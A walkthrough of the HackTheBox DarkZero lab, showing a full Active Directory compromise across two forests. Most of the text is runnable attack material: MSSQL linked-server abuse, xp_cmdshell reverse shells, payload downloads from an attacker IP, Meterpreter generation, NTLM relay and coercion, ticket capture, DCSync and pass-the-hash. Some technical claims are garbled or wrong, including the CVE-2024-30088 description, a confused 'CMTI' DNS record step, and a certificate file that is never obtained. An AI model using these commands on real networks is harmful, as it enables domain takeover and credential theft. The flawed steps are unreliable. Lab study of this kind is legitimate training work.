[🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)

> Practitioner-grade cybersecurity notes, cert prep guides, and courses. All premium notes available at **[buymeacoffee.com/notescatalog/extras](https://buymeacoffee.com/notescatalog/extras)** or [shop.motasem-notes.net](https://shop.motasem-notes.net)
## HackTheBox DarkZero Walkthrough Summary

DarkZero is a **two-forest assume-breach Active Directory** lab. The attack chain is:

1. Start with low-privileged domain creds (`john.w`) in `darkzero.htb`
2. Enumerate MSSQL on DC01 → discover a linked server to DC02 in the `darkzero.ext` forest
3. The mapped login (`dc01_sql_svc`) is **sysadmin** on DC02's MSSQL
4. Enable `xp_cmdshell` → shell as `svc_sql` on DC02
5. Escalate to SYSTEM on DC02 via **one of four paths**
6. As SYSTEM on DC02, abuse the **cross-forest TGT delegation** to capture DC01's machine account TGT → DCSync DC01

## Table of Contents

- [01 · Environment & Credentials](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#01--environment--credentials)
- [02 · Recon — Nmap](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#02--recon--nmap)
- [03 · SMB Enumeration](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#03--smb-enumeration)
- [04 · BloodHound Collection](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#04--bloodhound-collection)
- [05 · MSSQL Enumeration & Linked Server Abuse](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#05--mssql-enumeration--linked-server-abuse)
- [06 · Shell as svc_sql on DC02](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#06--shell-as-svc_sql-on-dc02)
- [07 · Post-Exploitation Enumeration on DC02](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#07--post-exploitation-enumeration-on-dc02)
- [08 · Path 1 — Token Theft via Named Pipe + GodPotato (Unintended)](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#08--path-1--token-theft-via-named-pipe--godpotato-unintended)
- [09 · Path 2 — ADCS + Password Change + RunAsCS (Intended)](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#09--path-2--adcs--password-change--runascs-intended)
- [10 · Path 3 — NTLM Authentication Reflection via CMTI DNS Record (Unintended)](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#10--path-3--ntlm-authentication-reflection-via-cmti-dns-record-unintended)
- [11 · Path 4 — CVE-2024-30088 (Unintended)](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#11--path-4--cve-2024-30088-unintended)
- [12 · Cross-Forest Trust Abuse → DC01 Domain Compromise](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#12--cross-forest-trust-abuse--dc01-domain-compromise)
- [Key Concepts & Analyst Notes](https://claude.ai/chat/9a3cadc5-7310-4a92-896f-0b16344ffaa3#key-concepts--analyst-notes)

---

## 01 · Environment & Credentials

**Given credentials (assume-breach scenario):**

|Account|Password|
|---|---|
|`darkzero.htb\john.w`|`RFulUtONCOL!`|

**Network topology:**

|Host|IP|Domain|Role|
|---|---|---|---|
|DC01|10.129.5.34|darkzero.htb|Domain Controller, Forest 1|
|DC02|172.16.20.2|darkzero.ext|Domain Controller, Forest 2|

- DC02 is **not directly reachable** from the attacker — pivoting via Chisel is required
- Bidirectional **cross-forest trust** exists between `darkzero.htb` ↔ `darkzero.ext`

```bash
# Add DC01 to /etc/hosts
netexec smb 10.129.5.34 --generate-hosts-file hosts
cat hosts /etc/hosts | sudo sponge /etc/hosts

# Sync time if Kerberos auth is failing (clock skew)
sudo ntpdate DC01.darkzero.htb
```

---

## 02 · Recon — Nmap

```bash
# Fast full port scan
sudo nmap -p- -vvv --min-rate 10000 10.129.5.34

# Service/version scan on key ports
sudo nmap -p 53,88,139,389,445,464,593,636,1433,2179,3268,3269,5985 -sCV 10.129.5.34
```

**Key open ports on DC01:**

|Port|Service|Notes|
|---|---|---|
|53|DNS|Standard DC port|
|88|Kerberos|Standard DC port|
|389 / 636|LDAP / LDAPS|Standard DC port|
|445|SMB|Signing enforced — relay attacks blocked|
|1433|MSSQL|**SQL Server 2022** — non-standard for a DC|
|2179|Hyper-V RDP|Can connect with creds + VM GUID|
|3268 / 3269|Global Catalog|Standard DC port|
|5985|WinRM|Standard DC port|

> 💡 **TTL of 127** confirms Windows, one hop away. No clock skew detected against this box. Port 1433 (MSSQL) on a Domain Controller is unusual and should be prioritized for enumeration.

---

## 03 · SMB Enumeration

### Validate Credentials

```bash
netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'    # SMB
netexec ldap DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'   # LDAP
netexec winrm DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'  # WinRM (FAIL - no access)
netexec mssql DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!'  # MSSQL (SUCCESS)
```

### User Enumeration

```bash
# List domain users
netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' --users

# RID brute-force — reveals groups, computers, and trust objects
netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' --rid-brute
```

**Notable RID entries:**

```
2602: darkzero\darkzero-ext$   (SidTypeUser)   # Trust account for darkzero.ext forest
2603: darkzero\john.w          (SidTypeUser)
1000: darkzero\DC01$           (SidTypeUser)
```

> 💡 The `darkzero-ext$` trust account is the inter-forest trust TDO object — its presence confirms the cross-forest trust. You can pivot off this later.

### Share Enumeration

```bash
netexec smb DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' --shares
```

Only standard DC shares (`NETLOGON`, `SYSVOL`, `IPC$`, `ADMIN$`, `C$`). `john.w` can read `IPC$`, `NETLOGON`, `SYSVOL` — nothing interesting in their contents.

---

## 04 · BloodHound Collection

### Collection Methods

```bash
# netexec (fast, uses LDAP)
netexec ldap DC01.darkzero.htb -u john.w -p 'RFulUtONCOL!' \
    --bloodhound -c All --dns-server 10.129.5.34

# RustHound-CE (alternative, includes ADCS template data)
rusthound-ce --domain darkzero.htb -u john.w -p 'RFulUtONCOL!' --ldaps --zip
```

> 💡 **RustHound-CE** is preferred when ADCS is present — it enumerates certificate templates (`certtemplates`) and Enterprise CAs in the BloodHound format. The netexec collector doesn't always include this data.

### Key BloodHound Findings

- `john.w` has **Enroll** rights on some certificate templates (typical for Domain Users — not immediately exploitable from DC01)
- `darkzero.htb` has a **bidirectional cross-forest trust** with `darkzero.ext`
- 11 enabled certificate templates found on DC01's ADCS

```
MachineAccountQuota: 10    # Domain users can add up to 10 machine accounts
```

---

## 05 · MSSQL Enumeration & Linked Server Abuse

### Connect to MSSQL on DC01

```bash
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
```

### Local Enumeration on DC01

```sql
-- List databases (nothing interesting)
enum_db

-- List logins (john.w is NOT sysadmin)
enum_logins

-- john.w is only a guest-level user
enum_users
```

### Discover Linked Servers (Critical)

```sql
-- List linked servers — finds DC02.darkzero.ext
enum_links
```

**Output reveals:**

```
DC02.darkzero.ext   darkzero\john.w  (maps to)  dc01_sql_svc
```

This means: when `john.w` makes queries to `DC02.darkzero.ext` via the linked server, they authenticate as `dc01_sql_svc`.

### Abuse Linked Server on DC02

```sql
-- Confirm the mapped identity on DC02
EXEC ('SELECT SYSTEM_USER') AT [DC02.darkzero.ext]
-- Result: dc01_sql_svc

-- Check if dc01_sql_svc is sysadmin on DC02
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
-- Result: 1 (YES — sysadmin!)

-- Switch context directly to DC02
use_link [DC02.darkzero.ext]
```

### Enable xp_cmdshell on DC02 and Get RCE

```sql
-- After switching context to DC02:
enable_xp_cmdshell

-- Verify execution context
xp_cmdshell whoami
-- Result: darkzero-ext\svc_sql
```

> ⚠️ **Key insight:** A linked server login mapping with cross-forest privileges is a common misconfiguration in enterprise environments. The `dc01_sql_svc` account has sysadmin on DC02, which grants immediate OS command execution via `xp_cmdshell`.

---

## 06 · Shell as svc_sql on DC02

### Get a Reverse Shell via xp_cmdshell

```bash
# On attacker machine — start listener
rlwrap -cAr nc -lnvp 443
```

```sql
-- On DC01 MSSQL, with context set to DC02:
-- Send a PowerShell Base64-encoded reverse shell
xp_cmdshell powershell -e <BASE64_REVERSE_SHELL>
```

Generate the payload at [revshells.com](https://www.revshells.com/) → **PowerShell #3 (Base64)**.

**Result:**

```
PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
```

---

## 07 · Post-Exploitation Enumeration on DC02

### Basic System Info

```powershell
hostname              # DC02
whoami                # darkzero-ext\svc_sql
ipconfig              # 172.16.20.2 (DC02 is NOT directly reachable from attacker)

systeminfo
# Domain: darkzero.ext
# OS: Windows Server 2022 Datacenter Build 20348
# Hotfix(s): N/A  <-- UNPATCHED — check for kernel CVEs!
```

### Discover Policy Backup File

```powershell
ls C:\
# C:\Policy_Backup.inf
```

This `.inf` file is the output of `secedit /export` or a Group Policy backup. It contains **user rights assignments** (`Privilege Rights` section):

**Key finding in `Policy_Backup.inf`:**

```
SeServiceLogonRight = *S-1-5-20,svc_sql,...
```

This tells us `svc_sql` has `SeServiceLogonRight` — meaning the account **can perform a service logon**. This is critical for the intended privilege escalation path.

**Why the current shell lacks `SeImpersonatePrivilege`:**

The shell received via `xp_cmdshell` → PowerShell is an **interactive/network logon**, not a service logon. Windows strips `SeImpersonatePrivilege` from these logon types as a hardening measure. The original service-start logon token (stored in LSASS) still has the full privilege set.

---

## 08 · Path 1 — Token Theft via Named Pipe + GodPotato (Unintended)

### Concept

When MSSQL started at boot, Windows created an **initial logon session** for `svc_sql` with the full service token (including `SeImpersonatePrivilege`). LSASS retains this token. By creating a named pipe and connecting to it via `\\localhost\pipe\<name>`, the **SMB redirector uses the stored token** (not the current process token). Impersonating the pipe client gives us the original full-privilege token.

**Reference:** [Tyranid's Lair — Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html)

### Step 1 — Prepare NtObjectManager Module

```powershell
# On Linux attacker machine (requires PowerShell)
pwsh
Install-Module -Name PSWSMan
Install-Module -Name NtObjectManager
Save-Module -Name NtObjectManager -Path /home/oxdf/
Compress-Archive -Path /home/oxdf/NtObjectManager/* -DestinationPath ./NtObjectManager.zip
```

```powershell
# On DC02 — upload, extract, import
wget http://10.10.14.61/NtObjectManager.zip -outfile NtObjectManager.zip
expand-archive NtObjectManager.zip -destinationpath .
cd 2.0.1
import-module .\NtObjectManager.psm1
```

### Step 2 — Steal the Token via Named Pipe

```powershell
# Create a named pipe and listen in background
$pipe = New-NtNamedPipeFile \\.\pipe\oxdf -Win32Path
$job = Start-Job { $pipe.Listen() }

# Connect to the pipe — SMB redirector uses original logon token
$file = Get-NtFile \\localhost\pipe\oxdf -Win32Path

# Impersonate the connection and capture the token
$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }

# Verify SeImpersonatePrivilege is present in the captured token
$token.privileges | ft Name, Attributes, DisplayName
```

**Expected output confirms `SeImpersonatePrivilege` is enabled:**

```
SeImpersonatePrivilege   EnabledByDefault, Enabled   Impersonate a client after authentication
```

```powershell
# Verify with a test process
New-Win32Process -Commandline 'cmd.exe /c whoami /priv 2>&1 > C:\programdata\output.txt' -token $token
cat C:\programdata\output.txt
# SeImpersonatePrivilege is Enabled
```

### Step 3 — GodPotato for SYSTEM

```powershell
# Upload GodPotato and reverse shell script
wget 10.10.14.61/GodPotato-NET4.exe -outfile gp.exe
wget 10.10.14.61/shell.ps1 -outfile shell.ps1

# Run GodPotato using the stolen token
New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"' -token $token
```

**Result:** SYSTEM reverse shell on DC02:

```
PS C:\Windows\system32> whoami
nt authority\system
```

> 💡 **Tip:** Storing the reverse shell in a `.ps1` file rather than passing it inline to GodPotato is more reliable.

---

## 09 · Path 2 — ADCS + Password Change + RunAsCS (Intended)

### Concept

To use `RunAsCS.exe` for a service logon (which gives a full-privilege token), we need the `svc_sql` account **password**. We can obtain the NT hash via ADCS (PKINIT authentication), then change the password using the hash.

**Attack chain:** `Rubeus tgtdeleg` → TGT → ADCS enrollment via Certipy → NT hash → change password → RunAsCS → service logon token → GodPotato → SYSTEM

### Step 1 — Set Up Chisel Tunnel to DC02

DC02 (172.16.20.2) is not directly reachable from the attacker. Route through DC01.

```bash
# On attacker machine
./chisel server -p 9002 -reverse -v

# On DC02 (via current shell)
.\chisel.exe client <LHOST>:9002 R:socks
```

```bash
# Add to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Add DC02 to /etc/hosts
echo "172.16.20.2 DC02.darkzero.ext darkzero.ext DC02" | sudo tee -a /etc/hosts
```

### Step 2 — Get TGT via Rubeus tgtdeleg

```powershell
# On DC02 — get a forwarded TGT via Kerberos delegation
.\rubeus.exe tgtdeleg /nowrap
```

```bash
# On attacker — convert kirbi to ccache
echo <BASE64_TICKET> | base64 -d > svc_sql.kirbi
ticketConverter.py svc_sql.kirbi svc_sql.ccache

# Inspect the ticket
describeTicket.py svc_sql.ccache
# Flags: forwardable, forwarded, renewable, pre_authent, enc_pa_rep
```

> ⚠️ **Important:** The ticket has the `forwarded` flag but NOT the `initial` flag. The `initial` flag only appears on TGTs issued directly by the KDC (password/PKINIT auth). `kpasswd` requires `initial`, so this ticket **cannot be used to change the password directly**. It CAN be used for service authentication like ADCS enrollment.

### Step 3 — Get NT Hash via ADCS (Certipy)

```bash
export KRB5CCNAME=svc_sql.ccache

# Request a certificate using PKINIT enrollment — this authenticates as svc_sql
# and Certipy will derive the NT hash from the PKINIT exchange
proxychains certipy auth -pfx svc_sql.pfx -dc-ip 172.16.20.2 -domain darkzero.ext
# NT hash for svc_sql is extracted from the AS-REP PKINIT response
```

### Step 4 — Change Password

```bash
# Use the NT hash to change the password (Impacket changepasswd)
proxychains changepasswd.py darkzero.ext/svc_sql@DC02.darkzero.ext \
    -hashes :<NT_HASH> -newpass 'NewP@ss123!' -no-pass

# Verify new credentials work
proxychains netexec smb DC02.darkzero.ext -u svc_sql -p 'NewP@ss123!'
```

### Step 5 — Service Logon via RunAsCS

```powershell
# On DC02 — run a reverse shell as svc_sql with a SERVICE logon type
# This produces a full-privilege token with SeImpersonatePrivilege
.\RunasCs.exe svc_sql 'NewP@ss123!' 'powershell C:\programdata\shell.ps1' \
    --logon-type 5   # 5 = LOGON32_LOGON_SERVICE
```

> 💡 `LOGON32_LOGON_SERVICE` (type 5) is what MSSQL uses when the service starts at boot. It produces a full-privilege token rather than the restricted interactive/network token. `svc_sql` is explicitly granted `SeServiceLogonRight` in the policy backup, which is why this works.

**This shell now has `SeImpersonatePrivilege` → run GodPotato → SYSTEM** (same as Path 1 from Step 3 onward).

---

## 10 · Path 3 — NTLM Authentication Reflection via CMTI DNS Record (Unintended)

### Concept

This technique uses the **Credential Manager Target Information (CMTI)** DNS record (`wpad.darkzero.ext` or a custom `wpad` DNS entry) to trick DC02's machine account into authenticating via NTLM to a relay server. The relay forwards the NTLM authentication to DC02's own LDAPS service, creating a **self-relay**. This abuses a vulnerability class related to CVE-2025-33073 / CVE-2025-58726 / CVE-2025-54918.

**Prerequisites:**

- Ability to add a DNS record in `darkzero.ext` (MachineAccountQuota = 10, so any domain user can do this)
- A Chisel tunnel to reach DC02 from the attacker
- `ntlmrelayx` with partial MIC (Message Integrity Code) removal

### Step 1 — Create CMTI DNS Record

```bash
# Via DC02 shell — use dnstool.py to add a DNS A record pointing back to attacker
proxychains dnstool.py -u 'darkzero.ext\svc_sql' -p 'NewP@ss123!' \
    --action add --record 'wpad' --data <LHOST> --type A DC02.darkzero.ext
```

> 💡 The DNS record creates a **target for NTLM authentication** — when DC02's machine account tries to authenticate to `wpad.darkzero.ext`, it authenticates to the attacker's relay server instead.

### Step 2 — Coerce DC02 Machine Account Authentication

```bash
# Option 1: Responder (passive — wait for machine auth)
sudo responder -I eth0 -A    # analysis mode first to check

# Option 2: Coerce with PetitPotam
python3 PetitPotam.py -u svc_sql -p 'NewP@ss123!' -d darkzero.ext <ATTACKER_IP> DC02.darkzero.ext

# Option 3: netexec coerce-plus module
proxychains netexec smb DC02.darkzero.ext -u svc_sql -p 'NewP@ss123!' \
    -M coerce_plus -o LISTENER=<ATTACKER_IP>
```

### Step 3 — Relay to DC02 LDAPS (Partial MIC Bypass)

SMB signing is enforced on DC02, blocking traditional SMB relay. However, LDAPS relay is still possible when using the **partial MIC** technique — the NTLMv2 handshake can be stripped of its MIC under certain conditions, allowing relay to LDAPS even when the original connection had signing.

```bash
# Start ntlmrelayx targeting DC02's LDAPS — relay DC02$ to itself
# --remove-mic strips the MIC from the NTLM exchange
sudo ntlmrelayx.py -t ldaps://DC02.darkzero.ext \
    --remove-mic \
    --add-computer ATTACKPC \
    --escalate-user svc_sql \
    -smb2support
```

**Result:** DC02's machine account authenticates to its own LDAPS. `ntlmrelayx` performs an action in the DC02 LDAP context (e.g., add a machine account, grant DCSync, or escalate privileges), leading to SYSTEM access.

---

## 11 · Path 4 — CVE-2024-30088 (Unintended)

### Concept

CVE-2024-30088 is a **Windows Kernel Time of Check Time of Use (TOCTOU) privilege escalation** in the `clfs.sys` (Common Log File System) driver that allows a standard user to gain SYSTEM. Applies to **Windows Server 2022 Build 20348** with no patches applied (`Hotfix(s): N/A`).

### Step 1 — Generate Meterpreter Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
```

### Step 2 — Get Meterpreter Session

```bash
# On attacker
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
run
```

```powershell
# Upload and execute on DC02
wget http://<LHOST>/shell.exe -outfile shell.exe
.\shell.exe
```

### Step 3 — Local Exploit Suggester + CVE-2024-30088

```bash
# In Meterpreter session
run post/multi/recon/local_exploit_suggester

# It will suggest CVE-2024-30088
use exploit/windows/local/cve_2024_30088_clfs_eop
set session 1
run
```

**Result:** SYSTEM shell on DC02.

---

## 12 · Cross-Forest Trust Abuse → DC01 Domain Compromise

### Concept

With SYSTEM on DC02 (Forest 2 DC), we can abuse the **bidirectional cross-forest trust** between `darkzero.ext` and `darkzero.htb`. When DC01 needs to authenticate resources in `darkzero.ext`, it sends a forwardable TGT to DC02. As SYSTEM on DC02, we can capture this TGT and use it to perform DCSync on DC01 — fully compromising Forest 1.

### Step 1 — Enumerate Cross-Forest Trust

```powershell
# On DC02 as SYSTEM
# Check AD trust configuration
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# Or via Impacket (from attacker)
proxychains Get-ADTrust -Filter * | Select Name, TrustType, TrustDirection
```

```sql
-- Via MSSQL on DC01 (already compromised)
-- Enumerate trusted domains via xp_dirtree or linked servers
```

> 💡 The `darkzero-ext$` trust account (SID 2602) visible in the DC01 RID brute-force earlier is the TDO object representing this trust. The `Forest Trust Accounts` (SID 528) group is also present.

### Step 2 — Capture DC01 Machine Account TGT

When DC01 authenticates to DC02 (e.g., for replication, resource access, or trust verification), it presents a forwardable TGT. As SYSTEM on DC02, we can monitor and extract this:

```powershell
# On DC02 — monitor for incoming Kerberos tickets from DC01$
.\rubeus.exe monitor /interval:5 /filteruser:DC01$
```

```powershell
# Trigger DC01 to authenticate to DC02 (coerce auth via various methods)
# Option 1: xp_dirtree via the linked server on DC01
# From the MSSQL session on DC01:
EXEC ('xp_dirtree ''\\DC02.darkzero.ext\share''') AT [DC01]

# Option 2: Coerce via PetitPotam/PrinterBug targeting DC01 → DC02
python3 PetitPotam.py -u 'darkzero-ext\svc_sql' -p 'NewP@ss123!' \
    -d darkzero.ext DC02.darkzero.ext DC01.darkzero.htb
```

**Capture the DC01$ TGT from Rubeus monitor output.**

### Step 3 — Convert and Use DC01$ TGT

```bash
# On attacker — decode and convert the captured TGT
echo <BASE64_TGT> | base64 -d > DC01_machine.kirbi
ticketConverter.py DC01_machine.kirbi DC01_machine.ccache

export KRB5CCNAME=DC01_machine.ccache
```

### Step 4 — DCSync DC01

```bash
# Use DC01$ machine account TGT to perform DCSync on the darkzero.htb domain
secretsdump.py -k -no-pass DC01.darkzero.htb \
    -just-dc -outputfile darkzero_hashes

# Verify output
cat darkzero_hashes.ntds
# All domain hashes including krbtgt, Administrator, john.w
```

### Step 5 — Authenticate to DC01

```bash
# Use Administrator NT hash for PTH to DC01
evil-winrm -i DC01.darkzero.htb -u Administrator -H <ADMIN_NTLM_HASH>

# Or with Impacket PSExec
psexec.py -hashes :<ADMIN_NTLM> 'darkzero.htb/Administrator@DC01.darkzero.htb'
```

---

## Key Concepts & Analyst Notes

### MSSQL Linked Server Abuse

```sql
-- Enumerate linked servers
enum_links

-- Execute commands on linked server (without switching context)
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER]
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER]
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER]

-- Switch context to linked server for easier interaction
use_link [LINKED_SERVER]
```

> ⚠️ **Analyst note:** Linked server login mappings are a common enterprise misconfiguration. A low-privileged account in one domain can map to a highly privileged account in another. Always check `enum_links` on any MSSQL instance you have access to.

---

### SeImpersonatePrivilege — Token Recovery via Named Pipe

When a service account runs with a **restricted token** (no `SeImpersonatePrivilege` in the current process), the original full-privilege token is still in LSASS. Named pipe impersonation forces the SMB redirector to authenticate with the original stored logon session token:

```powershell
# Create pipe
$pipe = New-NtNamedPipeFile \\.\pipe\mypipe -Win32Path
$job = Start-Job { $pipe.Listen() }

# Connect to it — SMB redirector uses stored logon token
$file = Get-NtFile \\localhost\pipe\mypipe -Win32Path

# Impersonate client → get original token
$token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }

# Use token to spawn privileged process
New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "cmd.exe"' -token $token
```

**When does this apply?** Any MSSQL or IIS service that runs under a domain account with `SeImpersonatePrivilege`, but where the current shell has a stripped token (xp_cmdshell network logon, etc.).

---

### SeServiceLogonRight — Full Token via Service Logon

```
SeServiceLogonRight ← listed in secedit/Group Policy as "Log on as a service"
```

If a service account has `SeServiceLogonRight`, you can start a process with logon type `5` (SERVICE), which produces a **full-privilege token** including `SeImpersonatePrivilege`:

```powershell
# RunAsCs with logon type 5 (service logon)
.\RunasCs.exe <USERNAME> <PASSWORD> 'cmd.exe' --logon-type 5

# Or: powershell / any executable
.\RunasCs.exe svc_sql 'NewP@ss123!' 'C:\programdata\shell.ps1' --logon-type 5
```

> 💡 This requires the **plaintext password** of the account. If you only have a TGT or hash, use ADCS PKINIT enrollment to extract the NT hash first, then change the password to something known.

---

### Kerberos Ticket Flags — initial vs. forwarded

|Flag|Meaning|Where it appears|
|---|---|---|
|`initial`|TGT issued directly by KDC (AS-REQ)|Normal `kinit`, PKINIT, password auth|
|`forwarded`|TGT obtained via delegation|Rubeus `tgtdeleg`, GSS-API delegation|
|`forwardable`|TGT can be delegated|Most service account TGTs|
|`renewable`|Ticket can be renewed|Standard TGT behavior|

**`kpasswd` service requires `initial` flag** — a `forwarded` TGT cannot be used to change a password directly. Use PKINIT/ADCS enrollment instead to get the NT hash.

```bash
# Convert kirbi to ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Inspect ticket flags
describeTicket.py ticket.ccache
```

---

### Cross-Forest Trust Delegation Abuse

When a **bidirectional trust** is configured with TGT delegation enabled, machine accounts can forward their TGTs across the trust boundary. As SYSTEM on a DC in Forest B, you can:

1. Capture TGTs from Forest A DCs when they authenticate to Forest B
2. Use those TGTs to impersonate the DC machine account in Forest A
3. Perform DCSync on Forest A's domain

```bash
# Monitor for cross-forest TGTs (on Forest B DC as SYSTEM)
.\rubeus.exe monitor /interval:5 /filteruser:DC01$

# Coerce Forest A DC to authenticate to Forest B DC
python3 PetitPotam.py <FOREST_B_DC> <FOREST_A_DC> -u ... -p ...

# Use captured TGT for secretsdump
export KRB5CCNAME=DC01_machine.ccache
secretsdump.py -k -no-pass DC01.darkzero.htb -just-dc
```

---

### ADCS — Certipy Workflow (via Kerberos)

```bash
# Find vulnerable templates (ESC1, ESC2, etc.)
certipy find -u user@domain -p password -dc-ip <DC_IP> -vulnerable -stdout

# Request certificate (ESC1 — any SANs allowed)
certipy req -u user@domain -p password -dc-ip <DC_IP> \
    -target <CA_HOST> -ca '<CA_NAME>' -template '<TEMPLATE>' \
    -upn administrator@domain

# Authenticate with certificate → get NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain domain.ext

# Shadow credentials attack
certipy shadow auto -u user@domain -p password -dc-ip <DC_IP> -account <TARGET>
```

---

### Useful Commands Quick Reference

|Task|Command|
|---|---|
|Generate hosts file|`netexec smb <IP> --generate-hosts-file hosts`|
|RID brute (groups + users)|`netexec smb <HOST> -u user -p pass --rid-brute`|
|BloodHound via netexec|`netexec ldap <HOST> -u user -p pass --bloodhound -c All`|
|MSSQL connect|`mssqlclient.py domain/user:'pass'@host -windows-auth`|
|MSSQL linked server enum|`enum_links`|
|MSSQL switch to linked server|`use_link [SERVER]`|
|Enable xp_cmdshell|`enable_xp_cmdshell`|
|Convert kirbi to ccache|`ticketConverter.py ticket.kirbi ticket.ccache`|
|Inspect ticket flags|`describeTicket.py ticket.ccache`|
|Chisel SOCKS proxy|`chisel server -p 9002 -reverse -v` / `chisel client <LHOST>:9002 R:socks`|
|Change password via hash|`changepasswd.py domain/user@host -hashes :<NTLM> -newpass 'NewPass!'`|
|Secretsdump via Kerberos|`secretsdump.py -k -no-pass <HOST> -just-dc`|

---

### Key Files Found on DC02

|File|Path|Contents|
|---|---|---|
|Policy Backup|`C:\Policy_Backup.inf`|secedit export — user rights assignments. Reveals `svc_sql` has `SeServiceLogonRight`|
